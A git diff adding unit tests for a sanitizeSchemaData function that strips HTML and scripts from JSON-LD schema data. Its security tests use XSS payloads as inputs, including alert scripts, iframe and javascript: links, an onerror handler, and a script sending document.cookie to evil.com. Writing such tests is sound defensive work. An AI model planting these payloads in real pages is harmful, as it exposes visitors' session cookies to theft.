@@ -1,4 +1,4 @@
-import { sanitizeHTML } from '@/lib/utils/sanitizeHTML'
+import { sanitizeHTML, sanitizeSchemaData } from '@/lib/utils/sanitizeHTML'
 
 describe('sanitizeHTML - Excerpt Configuration', () => {
   describe('Happy Path', () => {
@@ -601,5 +601,251 @@ describe('sanitizeHTML - Cache Behavior', () => {
     
     const finalResult = sanitizeHTML(lastHtml, 'full')
     expect(finalResult).toBe('<p>Third entry</p>')
+  })
+})
+
+describe('sanitizeSchemaData', () => {
+  describe('Happy Path', () => {
+    it('should return plain objects unchanged', () => {
+      const obj = { name: 'John', age: 30 }
+      const result = sanitizeSchemaData(obj)
+
+      expect(result).toEqual({ name: 'John', age: 30 })
+    })
+
+    it('should strip HTML from string values', () => {
+      const obj = { title: '<p>Hello World</p>' }
+      const result = sanitizeSchemaData(obj)
+
+      expect(result).toEqual({ title: 'Hello World' })
+    })
+
+    it('should handle nested objects', () => {
+      const obj = {
+        author: {
+          name: '<strong>Author Name</strong>',
+          bio: '<p>Bio text</p>'
+        }
+      }
+      const result = sanitizeSchemaData(obj)
+
+      expect(result).toEqual({
+        author: {
+          name: 'Author Name',
+          bio: 'Bio text'
+        }
+      })
+    })
+
+    it('should handle arrays of primitives', () => {
+      const obj = { tags: ['tag1', 'tag2', 'tag3'] }
+      const result = sanitizeSchemaData(obj)
+
+      expect(result).toEqual({ tags: ['tag1', 'tag2', 'tag3'] })
+    })
+
+    it('should handle arrays of objects', () => {
+      const obj = {
+        items: [
+          { name: '<b>Item 1</b>' },
+          { name: '<i>Item 2</i>' }
+        ]
+      }
+      const result = sanitizeSchemaData(obj)
+
+      expect(result).toEqual({
+        items: [
+          { name: 'Item 1' },
+          { name: 'Item 2' }
+        ]
+      })
+    })
+
+    it('should handle null values', () => {
+      const obj = { value: null }
+      const result = sanitizeSchemaData(obj)
+
+      expect(result).toEqual({ value: null })
+    })
+
+    it('should handle undefined values', () => {
+      const obj = { value: undefined }
+      const result = sanitizeSchemaData(obj)
+
+      expect(result).toEqual({ value: undefined })
+    })
+
+    it('should handle numbers', () => {
+      const obj = { count: 42, price: 19.99 }
+      const result = sanitizeSchemaData(obj)
+
+      expect(result).toEqual({ count: 42, price: 19.99 })
+    })
+
+    it('should handle booleans', () => {
+      const obj = { active: true, published: false }
+      const result = sanitizeSchemaData(obj)
+
+      expect(result).toEqual({ active: true, published: false })
+    })
+  })
+
+  describe('Security - Script Tag Removal', () => {
+    it('should remove script tags from strings', () => {
+      const obj = { title: '<script>alert("XSS")</script>Hello' }
+      const result = sanitizeSchemaData(obj)
+
+      expect(result).toEqual({ title: 'Hello' })
+    })
+
+    it('should remove script tags with attributes', () => {
+      const obj = { content: '<script src="evil.js"></script>Content' }
+      const result = sanitizeSchemaData(obj)
+
+      expect(result).toEqual({ content: 'Content' })
+    })
+
+    it('should remove script tags with multiline content', () => {
+      const obj = {
+        content: `<script>
+  document.location = 'http://evil.com?cookie=' + document.cookie
+</script>Safe content`
+      }
+      const result = sanitizeSchemaData(obj)
+
+      expect(result).toEqual({ content: 'Safe content' })
+    })
+
+    it('should remove nested script tags', () => {
+      const obj = { data: '<div><script>alert(1)</script><p>Text</p></div>' }
+      const result = sanitizeSchemaData(obj)
+
+      expect(result).toEqual({ data: 'Text' })
+    })
+
+    it('should handle multiple script tags', () => {
+      const obj = { value: '<script>a()</script>Text<script>b()</script>' }
+      const result = sanitizeSchemaData(obj)
+
+      expect(result).toEqual({ value: 'Text' })
+    })
+
+    it('should handle case-insensitive script tags', () => {
+      const obj = { title: '<SCRIPT>alert(1)</SCRIPT>Title' }
+      const result = sanitizeSchemaData(obj)
+
+      expect(result).toEqual({ title: 'Title' })
+    })
+  })
+
+  describe('Security - HTML Stripping', () => {
+    it('should strip all HTML tags', () => {
+      const obj = { html: '<div><span>Text</span></div>' }
+      const result = sanitizeSchemaData(obj)
+
+      expect(result).toEqual({ html: 'Text' })
+    })
+
+    it('should strip dangerous tags like iframe', () => {
+      const obj = { embed: '<iframe src="evil.com"></iframe>Content' }
+      const result = sanitizeSchemaData(obj)
+
+      expect(result).toEqual({ embed: 'Content' })
+    })
+
+    it('should strip object tags', () => {
+      const obj = { content: '<object data="evil.swf"></object>Text' }
+      const result = sanitizeSchemaData(obj)
+
+      expect(result).toEqual({ content: 'Text' })
+    })
+
+    it('should strip style tags', () => {
+      const obj = { style: '<style>.evil{}</style>Text' }
+      const result = sanitizeSchemaData(obj)
+
+      expect(result).toEqual({ style: 'Text' })
+    })
+
+    it('should handle inline JavaScript in attributes', () => {
+      const obj = { link: '<a href="javascript:alert(1)">Link</a>' }
+      const result = sanitizeSchemaData(obj)
+
+      expect(result).toEqual({ link: 'Link' })
+    })
+  })
+
+  describe('JSON-LD Schema.org Specific', () => {
+    it('should sanitize NewsArticle schema', () => {
+      const schema = {
+        '@context': 'https://schema.org',
+        '@type': 'NewsArticle',
+        headline: '<script>alert(1)</script>Valid Title',
+        description: '<p>Description</p>',
+      }
+      const result = sanitizeSchemaData(schema)
+
+      expect(result).toEqual({
+        '@context': 'https://schema.org',
+        '@type': 'NewsArticle',
+        headline: 'Valid Title',
+        description: 'Description',
+      })
+    })
+
+    it('should sanitize BreadcrumbList schema', () => {
+      const schema = {
+        '@context': 'https://schema.org',
+        '@type': 'BreadcrumbList',
+        itemListElement: [
+          { name: '<strong>Home</strong>', item: 'https://example.com' },
+          { name: 'Category', item: 'https://example.com/category' },
+        ],
+      }
+      const result = sanitizeSchemaData(schema)
+
+      expect(result).toEqual({
+        '@context': 'https://schema.org',
+        '@type': 'BreadcrumbList',
+        itemListElement: [
+          { name: 'Home', item: 'https://example.com' },
+          { name: 'Category', item: 'https://example.com/category' },
+        ],
+      })
+    })
+
+    it('should sanitize author array with malicious content', () => {
+      const schema = {
+        author: [
+          { '@type': 'Person', name: '<script>evil()</script>Author' },
+          { '@type': 'Person', name: 'Clean Author' },
+        ],
+      }
+      const result = sanitizeSchemaData(schema)
+
+      expect(result).toEqual({
+        author: [
+          { '@type': 'Person', name: 'Author' },
+          { '@type': 'Person', name: 'Clean Author' },
+        ],
+      })
+    })
+
+    it('should handle complex nested schema with arrays', () => {
+      const schema = {
+        '@context': 'https://schema.org',
+        '@type': 'NewsArticle',
+        image: ['<script></script>https://example.com/image.jpg'],
+        author: [{ name: '<img onerror="alert(1)">Author</img>' }],
+      }
+      const result = sanitizeSchemaData(schema)
+
+      expect(result).toEqual({
+        '@context': 'https://schema.org',
+        '@type': 'NewsArticle',
+        image: ['https://example.com/image.jpg'],
+        author: [{ name: 'Author' }],
+      })
+    })
   })
 })
